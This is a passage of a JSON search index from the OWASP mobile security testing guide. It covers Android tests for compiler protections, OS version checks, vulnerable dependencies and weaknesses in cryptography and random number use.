used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Position Independent Code (PIC) Not Enabled</li> <li> Stack Canaries Not Enabled</li> </ul>","tags":["android","L1","L2","test","MSTG-CODE-9","masvs-code-4","deprecated"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0044/#overview","title":"Overview","text":"","tags":["android","L1","L2","test","MSTG-CODE-9","masvs-code-4","deprecated"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0044/#static-analysis","title":"Static Analysis","text":"<p>Test the app native libraries to determine if they have the PIE and stack smashing protections enabled.</p> <p>You can use  rabin2 to get the binary information. We'll use the  Android UnCrackable L4 v1.0 APK as an example.</p> <p>All native libraries must have <code>canary</code> and <code>pic</code> both set to <code>true</code>.</p> <p>That's the case for <code>libnative-lib.so</code>:</p> <pre><code>rabin2 -I lib/x86_64/libnative-lib.so | grep -E \"canary|pic\"\ncanary   true\npic      true\n</code></pre> <p>But not for <code>libtool-checker.so</code>:</p> <pre><code>rabin2 -I lib/x86_64/libtool-checker.so | grep -E \"canary|pic\"\ncanary   false\npic      true\n</code></pre> <p>In this example, <code>libtool-checker.so</code> must be recompiled with stack smashing protection support.</p>","tags":["android","L1","L2","test","MSTG-CODE-9","masvs-code-4","deprecated"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0222/","title":"MASTG-TEST-0222: Position Independent Code (PIC) Not Enabled","text":"","tags":["android","L2","test","MASWE-0116"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0222/#overview","title":"Overview","text":"<p>This test case checks if the native libraries of the app are compiled without enabling Position Independent Code (PIC), a common mitigation technique against memory corruption attacks.</p> <p>Since Android 5.0 (API level 21), Android requires all dynamically linked executables to support PIE.</p> <p>Build System Maintainers Guide - Additional Required Arguments: Android requires Position-independent executables beginning with API 21. Clang builds PIE executables by default. If invoking the linker directly or not using Clang, use <code>-pie</code> when linking.</p>","tags":["android","L2","test","MASWE-0116"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0222/#steps","title":"Steps","text":"<ol> <li>Extract the app contents ( Exploring the App Package).</li> <li>Run  Obtaining Compiler-Provided Security Features on each shared library and grep for \"pic\" or the corresponding keyword used by the selected tool.</li> </ol>","tags":["android","L2","test","MASWE-0116"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0222/#observation","title":"Observation","text":"<p>The output should list if PIC is enabled or disabled.</p>","tags":["android","L2","test","MASWE-0116"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0222/#evaluation","title":"Evaluation","text":"<p>The test case fails if PIC is disabled.</p>","tags":["android","L2","test","MASWE-0116"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0223/","title":"MASTG-TEST-0223: Stack Canaries Not Enabled","text":"","tags":["android","L2","test","MASWE-0116"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0223/#overview","title":"Overview","text":"<p>This test case checks if the native libraries of the app are compiled without stack canaries and therefore lacking stack smashing protection, a common mitigation technique against buffer overflow attacks.</p> <ul> <li>NDK libraries should have stack canaries enabled since the compiler does it by default.</li> <li>Other custom C/C++ libraries might not have stack canaries enabled because they lack the necessary compiler flags (<code>-fstack-protector-strong</code>, or <code>-fstack-protector-all</code>) or the canaries were optimized out by the compiler. See the Evaluation section for more details.</li> </ul>","tags":["android","L2","test","MASWE-0116"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0223/#steps","title":"Steps","text":"<ol> <li>Extract the app contents ( Exploring the App Package).</li> <li>Run  Obtaining Compiler-Provided Security Features on each shared library and grep for \"canary\" or the corresponding keyword used by the selected tool.</li> </ol>","tags":["android","L2","test","MASWE-0116"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0223/#observation","title":"Observation","text":"<p>The output should show if stack canaries are enabled or disabled.</p>","tags":["android","L2","test","MASWE-0116"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0223/#evaluation","title":"Evaluation","text":"<p>The test case fails if stack canaries are disabled.</p> <p>Developers need to ensure that the flags <code>-fstack-protector-strong</code>, or <code>-fstack-protector-all</code> are set in the compiler flags for all native libraries. This is especially important for custom C/C++ libraries that are not part of the NDK.</p> <p>When evaluating this please note that there are potential expected false positives for which the test case should be considered as passed. To be certain for these cases, they require manual review of the original source code and the compilation flags used.</p> <p>The following examples cover some of the false positive cases that might be encountered:</p>","tags":["android","L2","test","MASWE-0116"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0223/#use-of-memory-safe-languages","title":"Use of Memory Safe Languages","text":"<p>The Flutter framework does not use stack canaries because of the way Dart mitigates buffer overflows.</p>","tags":["android","L2","test","MASWE-0116"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0223/#compiler-optimizations","title":"Compiler Optimizations","text":"<p>Sometimes, due to the size of the library and the optimizations applied by the compiler, it might be possible that the library was originally compiled with stack canaries but they were optimized out. For example, this is the case for some react native apps. They are built with <code>-fstack-protector-strong</code> but when attempting to search for <code>stack_chk_fail</code> inside the <code>.so</code> files, it is not found.</p> <ul> <li>Empty .so files: Some .so files such as <code>libruntimeexecutor.so</code> or <code>libreact_render_debug.so</code> are effectively empty in release and therefore contain no symbols. Even if you were to attempt to build with <code>-fstack-protector-all</code>, you still won't be able to see the <code>stack_chk_fail</code> string as there are no method calls there.</li> <li>Lack of stack buffer calls: Other files such as <code>libreact_utils.so</code>, <code>libreact_config.so</code>, and <code>libreact_debug.so</code> are not empty and contain method calls, but those methods don't contain stack buffer calls, so there are no <code>stack_chk_fail</code> strings inside them.</li> </ul> <p>The React Native developers in this case declare that they won't be adding <code>-fstack-protector-all</code> as, in their case, they consider that doing so will add a performance hit for no effective security gain.</p>","tags":["android","L2","test","MASWE-0116"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0245/","title":"MASTG-TEST-0245: References to Platform Version APIs","text":"","tags":["android","L2","test","MASWE-0077"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0245/#overview","title":"Overview","text":"<p>This test verifies whether an app is running on a recent version of the Android operating system.</p> <p>In Kotlin, Android apps can determine the OS version using the <code>Build.VERSION.SDK_INT</code> property, which returns the API level of the current system. By comparing it to a specific version constant, such as <code>Build.VERSION_CODES.UPSIDE_DOWN_CAKE</code> for Android 14 (API level 34), apps can conditionally execute code based on the OS version. In this example, \"Upside Down Cake\" is the internal codename for Android 14.</p> <p>Android apps specify a <code>minSdkVersion</code>, which defines the oldest OS version they support. While a high <code>minSdkVersion</code> reduces the need for runtime version checks, dynamically verifying the OS version using <code>Build.VERSION.SDK_INT</code> remains beneficial. It allows apps to take advantage of newer, more secure features when available while maintaining backward compatibility.</p>","tags":["android","L2","test","MASWE-0077"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0245/#steps","title":"Steps","text":"<ol> <li>Use either  Static Analysis on Android with a tool such as  semgrep to identify APIs that check the version of the operating system.</li> </ol>","tags":["android","L2","test","MASWE-0077"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0245/#observation","title":"Observation","text":"<p>The output should contain a list of locations where relevant APIs are used.</p>","tags":["android","L2","test","MASWE-0077"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0245/#evaluation","title":"Evaluation","text":"<p>The test fails if the app does not include any API calls to verify the operating system version.</p>","tags":["android","L2","test","MASWE-0077"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0245/#demos","title":"Demos","text":"<p> MASTG-DEMO-0025: Uses of Build.VERSION.SDK_INT with semgrep </p>","tags":["android","L2","test","MASWE-0077"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0272/","title":"MASTG-TEST-0272: Identify Dependencies with Known Vulnerabilities in the Android Project","text":"","tags":["android","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0272/#overview","title":"Overview","text":"<p>In this test case we will identify dependencies in Android Studio and scan them with  dependency-check.</p>","tags":["android","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0272/#steps","title":"Steps","text":"<ol> <li>Follow  Software Composition Analysis (SCA) of Android Dependencies at Build Time and execute a scan through the build environment of Android Studio by using Gradle.</li> </ol>","tags":["android","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0272/#observation","title":"Observation","text":"<p>The output should include the dependency and the CVE identifiers for any dependency with known vulnerabilities.</p>","tags":["android","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0272/#evaluation","title":"Evaluation","text":"<p>The test case fails if you can find dependencies with known vulnerabilities.</p>","tags":["android","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0272/#demos","title":"Demos","text":"<p> MASTG-DEMO-0050: Identifying Insecure Dependencies in Android Studio  MASTG-DEMO-0051: Identifying Insecure Dependencies through SBOM Creation </p>","tags":["android","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0274/","title":"MASTG-TEST-0274: Dependencies with Known Vulnerabilities in the App's SBOM","text":"","tags":["android","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0274/#overview","title":"Overview","text":"<p>In this test case we are identifying dependencies with known vulnerabilities by relying on a Software Bill of Material (SBOM).</p>","tags":["android","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0274/#steps","title":"Steps","text":"<ol> <li>Either ask the development team to share a SBOM in CycloneDX format, or, if you have access to the original source code, create one following  Software Composition Analysis (SCA) of Android Dependencies by Creating a SBOM.</li> <li>Upload the SBOM to  dependency-track.</li> <li>Inspect the  dependency-track project for the use of vulnerable dependencies.</li> </ol>","tags":["android","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0274/#observation","title":"Observation","text":"<p>The output should include a list of dependencies with names and CVE identifiers, if any.</p>","tags":["android","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0274/#evaluation","title":"Evaluation","text":"<p>The test case fails if you can find dependencies with known vulnerabilities.</p>","tags":["android","L1","L2","test","MASWE-0076"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0013/","title":"MASTG-TEST-0013: Testing Symmetric Cryptography","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: </p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Use of Hardcoded Cryptographic Keys in Code</li> <li> Broken Symmetric Encryption Algorithms</li> </ul>","tags":["android","L1","L2","test","MSTG-CRYPTO-1","masvs-crypto-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0013/#overview","title":"Overview","text":"","tags":["android","L1","L2","test","MSTG-CRYPTO-1","masvs-crypto-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0013/#static-analysis","title":"Static Analysis","text":"<p>Identify all the instances of symmetric key encryption in code and look for any mechanism which loads or provides a symmetric key. You can look for:</p> <ul> <li>symmetric algorithms (such as <code>DES</code>, <code>AES</code>, etc.)</li> <li>specifications for a key generator (such as <code>KeyGenParameterSpec</code>, <code>KeyPairGeneratorSpec</code>, <code>KeyPairGenerator</code>, <code>KeyGenerator</code>, <code>KeyProperties</code>, etc.)</li> <li>classes importing <code>java.security.*</code>, <code>javax.crypto.*</code>, <code>android.security.*</code>, <code>android.security.keystore.*</code></li> </ul> <p>Check also the list of common cryptographic configuration issues.</p> <p>For each identified instance verify if the used symmetric keys:</p> <ul> <li>are not part of the application resources</li> <li>cannot be derived from known values</li> <li>are not hardcoded in code</li> </ul> <p>For each hardcoded symmetric key, verify that is not used in security-sensitive contexts as the only method of encryption.</p> <p>As an example we illustrate how to locate the use of a hardcoded encryption key. First disassemble and decompile ( Decompiling Java Code) the app to obtain Java code, e.g. by using  jadx.</p> <p>Now search the files for the usage of the <code>SecretKeySpec</code> class, e.g. by simply recursively grepping on them or using jadx search function:</p> <pre><code>grep -r \"SecretKeySpec\"\n</code></pre> <p>This will return all classes using the <code>SecretKeySpec</code> class. Now examine those files and trace which variables are used to pass the key material. The figure below shows the result of performing this assessment on a production ready application. We can clearly locate the use of a static encryption key that is hardcoded and initialized in the static byte array <code>Encrypt.keyBytes</code>.</p> <p></p>","tags":["android","L1","L2","test","MSTG-CRYPTO-1","masvs-crypto-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0013/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>You can use  Method Tracing on cryptographic methods to determine input / output values such as the keys that are being used. Monitor file system access while cryptographic operations are being performed to assess where key material is written to or read from. For example, monitor the file system by using the API monitor of  RMS Runtime Mobile Security.</p>","tags":["android","L1","L2","test","MSTG-CRYPTO-1","masvs-crypto-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0014/","title":"MASTG-TEST-0014: Testing the Configuration of Cryptographic Standard Algorithms","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0014: Testing the Configuration of Cryptographic Standard Algorithms (android)</p> <p> Send Feedback</p>","tags":["android","L1","L2","test","MSTG-CRYPTO-2","MSTG-CRYPTO-3","MSTG-CRYPTO-4","masvs-crypto-1"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0014/#overview","title":"Overview","text":"","tags":["android","L1","L2","test","MSTG-CRYPTO-2","MSTG-CRYPTO-3","MSTG-CRYPTO-4","masvs-crypto-1"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0014/#static-analysis","title":"Static Analysis","text":"<p>Identify all the instances of the cryptographic primitives in code. Identify all custom cryptography implementations. You can look for:</p> <ul> <li>classes <code>Cipher</code>, <code>Mac</code>, <code>MessageDigest</code>, <code>Signature</code></li> <li>interfaces <code>Key</code>, <code>PrivateKey</code>, <code>PublicKey</code>, <code>SecretKey</code></li> <li>functions <code>getInstance</code>, <code>generateKey</code></li> <li>exceptions <code>KeyStoreException</code>, <code>CertificateException</code>, <code>NoSuchAlgorithmException</code></li> <li>classes which uses <code>java.security.*</code>, <code>javax.crypto.*</code>, <code>android.security.*</code> and <code>android.security.keystore.*</code> packages.</li> </ul> <p>Identify that all calls to getInstance use default <code>provider</code> of security services by not specifying it (it means AndroidOpenSSL aka Conscrypt). <code>Provider</code> can only be specified in <code>KeyStore</code> related code (in that situation <code>KeyStore</code> should be provided as <code>provider</code>). If other <code>provider</code> is specified it should be verified according to situation and business case (i.e. Android API version), and <code>provider</code> should be examined against potential vulnerabilities.</p> <p>Ensure that the best practices outlined in the \"Cryptography for Mobile Apps\" chapter are followed. Look at insecure and deprecated algorithms and common configuration issues.</p>","tags":["android","L1","L2","test","MSTG-CRYPTO-2","MSTG-CRYPTO-3","MSTG-CRYPTO-4","masvs-crypto-1"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0014/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>You can use  Method Tracing on cryptographic methods to determine input / output values such as the keys that are being used. Monitor file system access while cryptographic operations are being performed to assess where key material is written to or read from. For example, monitor the file system by using the API monitor of  RMS Runtime Mobile Security.</p>","tags":["android","L1","L2","test","MSTG-CRYPTO-2","MSTG-CRYPTO-3","MSTG-CRYPTO-4","masvs-crypto-1"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0015/","title":"MASTG-TEST-0015: Testing the Purposes of Keys","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0015: Testing the Purposes of Keys (android)</p> <p> Send Feedback</p>","tags":["android","L2","test","MSTG-CRYPTO-5","masvs-crypto-2"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0015/#overview","title":"Overview","text":"","tags":["android","L2","test","MSTG-CRYPTO-5","masvs-crypto-2"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0015/#static-analysis","title":"Static Analysis","text":"<p>Identify all instances where cryptography is used. You can look for:</p> <ul> <li>classes <code>Cipher</code>, <code>Mac</code>, <code>MessageDigest</code>, <code>Signature</code></li> <li>interfaces <code>Key</code>, <code>PrivateKey</code>, <code>PublicKey</code>, <code>SecretKey</code></li> <li>functions <code>getInstance</code>, <code>generateKey</code></li> <li>exceptions <code>KeyStoreException</code>, <code>CertificateException</code>, <code>NoSuchAlgorithmException</code></li> <li>classes importing <code>java.security.*</code>, <code>javax.crypto.*</code>, <code>android.security.*</code>, <code>android.security.keystore.*</code></li> </ul> <p>For each identified instance, identify its purpose and its type. It can be used:</p> <ul> <li>for encryption/decryption - to ensure data confidentiality</li> <li>for signing/verifying - to ensure integrity of data (as well as accountability in some cases)</li> <li>for maintenance - to protect keys during certain sensitive operations (such as being imported to the KeyStore)</li> </ul> <p>Additionally, you should identify the business logic which uses identified instances of cryptography.</p> <p>During verification the following checks should be performed:</p> <ul> <li>are all keys used according to the purpose defined during its creation? (it is relevant to KeyStore keys, which can have KeyProperties defined)</li> <li>for asymmetric keys, is the private key being exclusively used for signing and the public key encryption?</li> <li>are symmetric keys used for multiple purposes? A new symmetric key should be generated if it's used in a different context.</li> <li>is cryptography used according to its business purpose?</li> </ul>","tags":["android","L2","test","MSTG-CRYPTO-5","masvs-crypto-2"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0015/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>You can use  Method Tracing on cryptographic methods to determine input / output values such as the keys that are being used. Monitor file system access while cryptographic operations are being performed to assess where key material is written to or read from. For example, monitor the file system by using the API monitor of  RMS Runtime Mobile Security.</p>","tags":["android","L2","test","MSTG-CRYPTO-5","masvs-crypto-2"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0016/","title":"MASTG-TEST-0016: Testing Random Number Generation","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: </p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Insecure Random API Usage</li> <li> Non-random Sources Usage</li> </ul>","tags":["android","L1","L2","test","MSTG-CRYPTO-6","masvs-crypto-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0016/#overview","title":"Overview","text":"","tags":["android","L1","L2","test","MSTG-CRYPTO-6","masvs-crypto-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0016/#static-analysis","title":"Static Analysis","text":"<p>Identify all the instances of random number generators and look for either custom or well-known insecure classes. For instance, <code>java.util.Random</code> produces an identical sequence of numbers for each given seed value; consequently, the sequence of numbers is predictable. Instead a well-vetted algorithm should be chosen that is currently considered to be strong by experts in the field, and a well-tested implementations with adequate length seeds should be used.</p> <p>Identify all instances of <code>SecureRandom</code> that are not created using the default constructor. Specifying the seed value may reduce randomness. Use only the no-argument constructor of <code>SecureRandom</code> that uses the system-specified seed value to generate a 128-byte-long random number.</p> <p>In general, if a PRNG is not advertised as being cryptographically secure (e.g. <code>java.util.Random</code>), then it is probably a statistical PRNG and should not be used in security-sensitive contexts. Pseudo-random number generators can produce predictable numbers if the generator is known and the seed can be guessed. A 128-bit seed is a good starting point for producing a \"random enough\" number.</p> <p>Once an attacker knows what type of weak pseudo-random number generator (PRNG) is used, it can be trivial to write a proof-of-concept to generate the next random value based on previously observed ones, as it was done for Java Random. In case of very weak custom random generators it may be possible to observe the pattern statistically. Although the recommended approach would anyway be to decompile the APK and inspect the algorithm (see Static Analysis).</p> <p>If you want to test for randomness, you can try to capture a large set of numbers and check with the Burp's sequencer to see how good the quality of the randomness is.</p>","tags":["android","L1","L2","test","MSTG-CRYPTO-6","masvs-crypto-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0016/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>You can use  Method Tracing on the mentioned classes and methods to determine input / output values being used.</p>","tags":["android","L1","L2","test","MSTG-CRYPTO-6","masvs-crypto-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0204/","title":"MASTG-TEST-0204: Insecure Random API Usage","text":"","tags":["android","L1","L2","test","MASWE-0027"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0204/#overview","title":"Overview","text":"<p>Android apps sometimes use an insecure pseudorandom number generator (PRNG), such as <code>java.util.Random</code>, which is a linear congruential generator and produces a predictable sequence for any given seed value. As a result, <code>java.util.Random</code> and <code>Math.random()</code> (the latter simply calls <code>nextDouble()</code> on a static <code>java.util.Random</code> instance) generate reproducible sequences across all Java implementations whenever the same seed is used. This predictability makes them unsuitable for cryptographic or other security-sensitive contexts.</p> <p>In general, if a PRNG is not explicitly documented as being cryptographically secure, it should not be used where randomness must be unpredictable. Refer to the Android Documentation and the \"random number generation\" guide for further details.</p>","tags":["android","L1","L2","test","MASWE-0027"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0204/#steps","title":"Steps","text":"<ol> <li>Run a static analysis ( Static Analysis on Android) tool on the app and look for insecure random APIs, or you can use  Method Tracing to detect the use of such APIs.</li> <li>For each of the identified API uses, check if they are used in a security relevant context. You can decompile the app ( Decompiling Java Code) and inspect the code ( Reviewing Decompiled Java Code) to confirm.</li> </ol>","tags":["android","L1","L2","test","MASWE-0027"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0204/#observation","title":"Observation","text":"<p>The output should contain a list of locations where insecure random APIs are used.</p>","tags":["android","L1","L2","test","MASWE-0027"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0204/#evaluation","title":"Evaluation","text":"<p>The test case fails if you can find random numbers generated using those APIs that are used in security-relevant contexts, such as generating passwords or authentication tokens.</p>","tags":["android","L1","L2","test","MASWE-0027"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0204/#mitigations","title":"Mitigations","text":"<ul> <li> Use Secure Random Number Generator APIs</li> </ul>","tags":["android","L1","L2","test","MASWE-0027"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0204/#demos","title":"Demos","text":"<p> MASTG-DEMO-0007: Common Uses of Insecure Random APIs </p>","tags":["android","L1","L2","test","MASWE-0027"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0205/","title":"MASTG-TEST-0205: Non-random Sources Usage","text":"","tags":["android","L1","L2","test","MASWE-0027"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0205/#overview","title":"Overview","text":"<p>Android applications sometimes use non-random sources to generate \"random\" values, leading to potential security vulnerabilities. Common practices include relying on the current time, such as <code>Date().getTime()</code>, or accessing <code>Calendar.MILLISECOND</code> to produce values that are easily guessable and reproducible.</p>","tags":["android","L1","L2","test","MASWE-0027"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0205/#steps","title":"Steps","text":"<ol> <li>Run a static analysis ( Static Analysis on Android) tool on the app and look for uses of non-random sources.</li> </ol>","tags":["android","L1","L2","test","MASWE-0027"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0205/#observation","title":"Observation","text":"<p>The output should contain a list of locations where non-random sources are used.</p>","tags":["android","L1","L2","test","MASWE-0027"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0205/#evaluation","title":"Evaluation","text":"<p>The test case fails if you can find security-relevant values, such as passwords or tokens, generated using non-random sources.</p>","tags":["android","L1","L2","test","MASWE-0027"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0205/#mitigations","title":"Mitigations","text":"<ul> <li> Use Secure Random Number Generator APIs</li> </ul>","tags":["android","L1","L2","test","MASWE-0027"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0205/#demos","title":"Demos","text":"<p> MASTG-DEMO-0008: Uses of Non-random Sources </p>","tags":["android","L1","L2","test","MASWE-0027"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0208/","title":"MASTG-TEST-0208: Insufficient Key Sizes","text":"","tags":["android","L1","L2","test","MASWE-0009"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0208/#overview","title":"Overview","text":"<p>In this test case, we will look for the use insufficient key sizes in Android apps. To do this, we need to focus on the cryptographic frameworks and libraries that are available in Android and the methods that are used to generate, inspect and manage cryptographic keys.</p> <p>The Java Cryptography Architecture (JCA) provides foundational classes for key generation which are often used directly when portability or compatibility with older systems is a concern.</p> <ul> <li><code>KeyGenerator</code>: The <code>KeyGenerator</code> class is used to generate symmetric keys including AES, DES, ChaCha20 or Blowfish, as well as various HMAC keys. The key size can be specified using the <code>init(int keysize)</code> method.</li> <li><code>KeyPairGenerator</code>: The <code>KeyPairGenerator</code> class is used for generating key pairs for asymmetric encryption (e.g., RSA, EC). The key size can be specified using the <code>initialize(int keysize)</code> method.</li> </ul> <p>For more information you can consult the MASTG section about \"Key Generation\".</p>","tags":["android","L1","L2","test","MASWE-0009"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0208/#steps","title":"Steps","text":"<ol> <li>Run a static analysis tool such as  semgrep on the code and look for uses of the cryptographic functions that generate keys.</li> </ol>","tags":["android","L1","L2","test","MASWE-0009"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0208/#observation","title":"Observation","text":"<p>The output should contain a list of locations where insufficient key lengths are used.</p>","tags":["android","L1","L2","test","MASWE-0009"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0208/#evaluation","title":"Evaluation","text":"<p>The test case fails if you can find the use of insufficient key sizes within the source code. For example, a 1024-bit key size is considered insufficient for RSA encryption and a 128-bit key size is considered insufficient for AES encryption considering quantum computing attacks.</p>","tags":["android","L1","L2","test","MASWE-0009"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0208/#demos","title":"Demos","text":"<p> MASTG-DEMO-0012: Cryptographic Key Generation With Insufficient Key Length </p>","tags":["android","L1","L2","test","MASWE-0009"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0212/","title":"MASTG-TEST-0212: Use of Hardcoded Cryptographic Keys in Code","text":"","tags":["android","L1","L2","test","MASWE-0014"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0212/#overview","title":"Overview","text":"<p>In this test case, we will look for the use of hardcoded keys in Android applications. To do this, we need to focus on the cryptographic implementations of hardcoded keys. The Java Cryptography Architecture (JCA) provides the <code>SecretKeySpec</code> class, which allows you to create a <code>SecretKey</code> from a byte array.</p>","tags":["android","L1","L2","test","MASWE-0014"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0212/#steps","title":"Steps","text":"<ol> <li>Use either  Static Analysis on Android with a tool such as  semgrep or  Method Tracing (dynamic analysis) with a tool like  Frida for Android to identify all the instances of symmetric key encryption in code and look for uses of the hardcoded cryptographic keys.</li> </ol>","tags":["android","L1","L2","test","MASWE-0014"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0212/#observation","title":"Observation","text":"<p>The output should contain a list of locations where hardcoded keys are used.</p>","tags":["android","L1","L2","test","MASWE-0014"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0212/#evaluation","title":"Evaluation","text":"<p>The test case fails if you find any hardcoded keys that are used in security-sensitive contexts.</p>","tags":["android","L1","L2","test","MASWE-0014"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0212/#demos","title":"Demos","text":"<p> MASTG-DEMO-0017: Use of Hardcoded AES Key in SecretKeySpec with semgrep </p>","tags":["android","L1","L2","test","MASWE-0014"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0221/","title":"MASTG-TEST-0221: Broken Symmetric Encryption Algorithms","text":"","tags":["android","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0221/#overview","title":"Overview","text":"<p>To test for the use of broken encryption algorithms in Android apps, we need to focus on methods from cryptographic frameworks and libraries that are used to perform encryption and decryption operations.</p> <ul> <li><code>Cipher.getInstance</code>: Initializes a Cipher object for encryption or decryption. The <code>algorithm</code> parameter can be one of the supported algorithms.</li> <li><code>SecretKeyFactory.getInstance</code>: Returns a SecretKeyFactory object that converts keys into key specifications and vice versa. The <code>algorithm</code> parameter can be one of the supported algorithms.</li> <li><code>KeyGenerator.getInstance</code>: Returns a <code>KeyGenerator</code> object that generates secret keys for symmetric algorithms. The <code>algorithm</code> parameter can be one of the supported algorithms.</li> </ul> <p>Some broken symmetric encryption algorithms include:</p> <ul> <li>DES (Data Encryption Standard): 56-bit key, breakable, withdrawn by NIST in 2005.</li> <li>3DES (Triple DES, officially the Triple Data Encryption Algorithm (TDEA or Triple DEA)): 64-bit block size, vulnerable to Sweet32 birthday attacks, withdrawn by NIST on January 1, 2024.</li> <li>RC4: Predictable key stream, allows plaintext recovery RC4 Weakness, disapproved by NIST in 2014 and prohibited by IETF in 2015.</li> 